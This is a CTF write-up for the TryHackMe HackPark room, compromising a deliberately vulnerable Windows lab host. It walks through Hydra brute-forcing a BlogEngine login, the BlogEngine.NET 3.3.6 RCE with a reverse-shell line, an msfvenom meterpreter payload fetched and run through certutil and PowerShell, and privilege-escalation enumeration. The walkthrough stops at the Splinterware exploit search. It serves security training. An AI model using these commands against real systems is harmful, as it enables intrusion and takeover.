---
title: Writeup for TryHackMe room - HackPark
author: 4n3i5v74
date: 2021-03-25 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, windows, privesc]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [HackPark](https://tryhackme.com/room/hackpark){:target="_blank"}

This room contains detailed info about `rejetto` http vulnerability exploitation and privilege escalation methods.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}.


## Tools Used

### Enumeration

- NMAP
- ZAP

### Cracking

- Hydra

### Exploitation

- Msfconsole
- Msfvenom
- Netcat
- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS){:target="_blank"}
- Windows Exploit Suggester


## Task 1 - Deploy the vulnerable Windows machine

### References
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Use `nmap` to enumerate the target machine using `nmap -PN -T4 -sS --top-ports 1000 --open --reason <ip>`

The output will be similar to
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-29 05:11 BST
Nmap scan report for <hostname> (<ip>)
Host is up, received arp-response (0.00066s latency).
Not shown: 998 filtered ports
Reason: 998 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-title: hackpark | hackpark amusements
3389/tcp open  ms-wbt-server syn-ack ttl 128
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-04-28T02:39:21
|_Not valid after:  2021-10-28T02:39:21
|_ssl-date: 2021-04-29T04:11:36+00:00; -1s from scanner time.
MAC Address: 02:1C:C7:70:27:5F (Unknown)

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` and load url `http://<ip>`. Right click on the page and use `View source`, which will display image source as `http://<ip>/image.axd?picture=/26572c3a-0e51-4a9f-9049-b64e730ca75d.jpg`.

Download the image and use `google image search` to get the picture info.


## Task 2 - Using Hydra to brute-force a login

### References
- [HTTP request methods](https://www.w3schools.com/tags/ref_httpmethods.asp){:target="_blank"}
- [Hydra](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hydra){:target="_blank"}

Use `ZAP` to perform an `automated scan`. Enable `traditional spider` and `ajax spider with HtmlUnit` and start attack to crawl the url.

There is a directory under the ip, named `Account` which has `POST:login.aspx`. Analyse the request `url` and `body` sent.

The request `url` will be similar to `http://<ip>/Account/login.aspx?ReturnURL=%2fadmin%2f`.

The request `body` will be similar to
{% capture code %}{% raw %}__VIEWSTATE=Fh%2BMZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75%2BUI7Wqx4VHyFiWcN%2BeBja%2B%2BG22qfdLsxtOu7hudc6LRo0t%2BWqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA%2B%2FNOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k%2BFWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY%2B%2FgLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI%2BaEWAPexNRUghR2IygRzK4Qk8%2B%2BaZga3q%2Bl3FN9Okwmr3MUt&__EVENTVALIDATION=zhjBpvqO5BEqQCJSn%2F47YkRFFuv5ho%2Fm7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv%2BSF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa%2BXbt28nNxaecmG4%2FPxDgkc8VTKyeIg5CC4JLOFfI&ctl00%24MainContent%24LoginUser%24UserName=ZAP&ctl00%24MainContent%24LoginUser%24Password=ZAP&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `hydra` to crack the password.
{% capture code %}{% raw %}hydra -l admin -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 16 <ip> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Fh%2BMZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75%2BUI7Wqx4VHyFiWcN%2BeBja%2B%2BG22qfdLsxtOu7hudc6LRo0t%2BWqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA%2B%2FNOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k%2BFWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY%2B%2FgLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI%2BaEWAPexNRUghR2IygRzK4Qk8%2B%2BaZga3q%2Bl3FN9Okwmr3MUt&__EVENTVALIDATION=zhjBpvqO5BEqQCJSn%2F47YkRFFuv5ho%2Fm7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv%2BSF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa%2BXbt28nNxaecmG4%2FPxDgkc8VTKyeIg5CC4JLOFfI&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Failed"{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Hydra (http://www.thc.org/thc-hydra) starting at 2021-04-29 05:30:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://<ip>:80//Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Fh%2BMZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75%2BUI7Wqx4VHyFiWcN%2BeBja%2B%2BG22qfdLsxtOu7hudc6LRo0t%2BWqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA%2B%2FNOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k%2BFWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY%2B%2FgLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI%2BaEWAPexNRUghR2IygRzK4Qk8%2B%2BaZga3q%2Bl3FN9Okwmr3MUt&__EVENTVALIDATION=zhjBpvqO5BEqQCJSn%2F47YkRFFuv5ho%2Fm7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv%2BSF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa%2BXbt28nNxaecmG4%2FPxDgkc8VTKyeIg5CC4JLOFfI&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Failed
[STATUS] 720.00 tries/min, 720 tries in 00:01h, 14343678 to do in 332:02h, 16 active
[80][http-post-form] host: <ip>   login: admin   password: <password>
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-04-29 05:33:03{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 3 - Compromise the machine

### References
- [BlogEngine RCE](https://www.exploit-db.com/exploits/46353){:target="_blank"}
- [Searchsploit ref](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-searchsploit){:target="_blank"}


Use `firefox` to login to url `http://<ip>/Account/login.aspx?ReturnURL=/admin/` with previously cracked password.

Use `searchsploit` to check for any known exploits.
{% capture code %}{% raw %}searchsploit "blogengine 3.3.6"{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remot | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal            | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal /  | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection         | aspx/webapps/47014.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results{% endraw %}{% endcapture %} {% include code.html code=code %}

Download the `RCE` expliot script `46353.cs`.
{% capture code %}{% raw %}  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
    URL: https://www.exploit-db.com/exploits/46353
    Path: /opt/searchsploit/exploits/aspx/webapps/46353.cs
File Type: HTML document, ASCII text, with CRLF line terminators

Copied to: /root/Windows-Exploit-Suggester/46353.cs{% endraw %}{% endcapture %} {% include code.html code=code %}

Copy the exploit `46353.cs` as `PostView.ascx`, and edit `PostView.ascx` with `ip` and `port` for `reverse shell`.
{% capture code %}{% raw %}using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("<ip>", 443)){% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to view the url `http://<ip>/admin/#/content/posts`, open folder icon and upload the file `PostView.ascx`.

Create a `netcat` listener.
{% capture code %}{% raw %}rlwrap -cAr nc -lnvp 443{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 443){% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to load the url `http://<ip>/?theme=../../App_Data/files` in order to spawn a `reverse shell`.

The `reverse shell` would have been spawned at `netcat` listener.
{% capture code %}{% raw %}Connection from <ip> 49252 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
iis apppool\blog{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 4 - Windows Privilege Escalation

### References
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester){:target="_blank"}
- [Splinterware System Scheduler PrivEsc](https://www.exploit-db.com/exploits/45072){:target="_blank"}
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe){:target="_blank"}


Download the `winPEAS` executable using `wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe`.

Use `msfvenom` to create a `reverse shell` payload.
{% capture code %}{% raw %}msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<ip> LPORT=4443 -f exe -o revshell.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Create a `python web server` to download the `reverse shell` payload.
{% capture code %}{% raw %}python -m http.server 8080{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...{% endraw %}{% endcapture %} {% include code.html code=code %}

From the `netcat` listener, download the payload
{% capture code %}{% raw %}c:\windows\system32\inetsrv> powershell -c "Invoke-WebRequest -Uri 'http://<source-ip>:8080/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
c:\windows\system32\inetsrv> c:\windows\temp\revshell.exe

c:\windows\system32\inetsrv> cd c:\windows\temp
c:\windows\system32\inetsrv> certutil -urlcache -split -f "http://<source-ip>:8080/revshell.exe" revshell.exe{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `msfconsole -q` to set `exploit/multi/handler` and its variables.
{% capture code %}{% raw %}msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

Name  Current Setting  Required  Description
----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port

Exploit target:

Id  Name
--  ----
0   Wildcard Target

msf5 exploit(multi/handler) > set LHOST <source-ip>
LHOST => <source-ip>
msf5 exploit(multi/handler) > set LPORT 4443
LPORT => 4443{% endraw %}{% endcapture %} {% include code.html code=code %}

Run the exploit to gain `meterpreter` shell and get system and process information.
{% capture code %}{% raw %}msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on <source-ip>:4443
[*] Sending stage (176195 bytes) to <target-ip>
[*] Meterpreter session 1 opened (<source-ip>:4443 -> <target-ip>:49303) at 2021-04-30 05:20:34 +0100

meterpreter > ps

Process List

PID   PPID  Name                  Arch  Session  User              Path
---   ----  ----                  ----  -------  ----              ----
0     0     [System Process]
4     0     System
348   672   svchost.exe
372   4     smss.exe
476   672   svchost.exe
524   516   csrss.exe
580   572   csrss.exe
592   516   wininit.exe
616   572   winlogon.exe
648   1348  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
672   592   services.exe
680   592   lsass.exe
740   672   svchost.exe
784   672   svchost.exe
860   616   dwm.exe
876   672   svchost.exe
908   672   svchost.exe
972   672   svchost.exe
1044  3048  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
1136  672   spoolsv.exe
1176  672   amazon-ssm-agent.exe
1240  672   svchost.exe
1272  672   LiteAgent.exe
1332  672   svchost.exe
1348  672   svchost.exe
1420  672   WService.exe
1548  2404  Message.exe
1552  1420  WScheduler.exe
1652  672   Ec2Config.exe
1784  740   WmiPrvSE.exe
1988  3048  revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
2016  672   svchost.exe
2404  1752  WScheduler.exe
2496  908   taskhostex.exe
2564  2556  explorer.exe
2912  672   msdtc.exe
3020  2520  ServerManager.exe
3048  648   cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe

meterpreter > shell
Process 2264 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          4/30/2021, 7:48:19 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                        [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,223 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 4,264 MB
Virtual Memory: In Use:    1,240 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                        [01]: KB2919355
                        [02]: KB2919442
                        [03]: KB2937220
                        [04]: KB2938772
                        [05]: KB2939471
                        [06]: KB2949621
                        [07]: KB3035131
                        [08]: KB3060716
Network Card(s):           1 NIC(s) Installed.
                        [01]: AWS PV Network Device
                                Connection Name: Ethernet 2
                                DHCP Enabled:    Yes
                                DHCP Server:     10.10.0.1
                                IP address(es)
                                [01]: 10.10.129.246
                                [02]: fe80::12d:9216:fea:825b
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.{% endraw %}{% endcapture %} {% include code.html code=code %}

Download the `winPEAS` binary from the `netcat` listener and execute it to analyse.
{% capture code %}{% raw %}c:\windows\system32\inetsrv>cd c:\windows\temp

c:\Windows\Temp>certutil -urlcache -split -f "http://10.10.47.105:8080/winPEASx64.exe" winPEASx64.exe
certutil -urlcache -split -f "http://10.10.47.105:8080/winPEASx64.exe" winPEASx64.exe
****  Online  ****
000000  ...
17e600
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>winPEASx64.exe
========================================(Services Information)========================================

[+] Interesting Services -non Microsoft-
[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
    Amazon EC2Launch

    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent

    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped

    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper{% endraw %}{% endcapture %} {% include code.html code=code %}

Install the prerequisites for `windows-exploit-suggester`.
{% capture code %}{% raw %}apt install python-xlrd python3-xlrd{% endraw %}{% endcapture %} {% include code.html code=code %}

Download the `windows-exploit-suggester` git repo using `git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git`.

Save the previously obtained output of command `systeminfo` to be analysed with `windows-exploit-suggester`.

Update the database for `windows-exploit-suggester`.
{% capture code %}{% raw %}python2 windows-exploit-suggester.py --update{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[*] initiating winsploit version 3.3...
[+] writing to file 2021-04-30-mssb.xls
[*] done{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `windows-exploit-suggester.py` script across the database to check for valid exploits.
{% capture code %}{% raw %}python2 windows-exploit-suggester.py --database 2021-04-30-mssb.xls --systeminfo systeminfo.txt{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 8 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 249 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*]
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*]
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*]
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*]
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*]
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[*] done{% endraw %}{% endcapture %} {% include code.html code=code %}

From the `meterpreter` shell in `msfconsole -q`, check the version of `system scheuler` for identifying any known exploits.
{% capture code %}{% raw %}meterpreter> shell
C:\Program Files (x86)\SystemScheduler>more README.txt
more README.txt
***System Scheduler Release Notes***

System Scheduler Professional - Version 5.12
Fix: Not correctly detecting Administrators when UAC is disabled
Fix: Very rare bug where system scheduler waits for executed program to complete before processing next event
Fix: Minor bug with Tray-Icon not reappearing when changing security settings{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `searchsploit` to check for any available exploits for `splinterware`.
{% capture code %}{% raw %}searchsploit "splinterware"{% endraw %}{% endcapture %} {% include code.html code=code %}

The output will be similar to
{% capture code %}{% raw %}-------------------------------------------------------------- ---------------------------------
Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Splinterware System Scheduler Pro 5.12 - Buffer Overflow (SEH | windows/local/45071.py
Splinterware System Scheduler Pro 5.12 - Privilege Escalation | windows/local/45072.txt
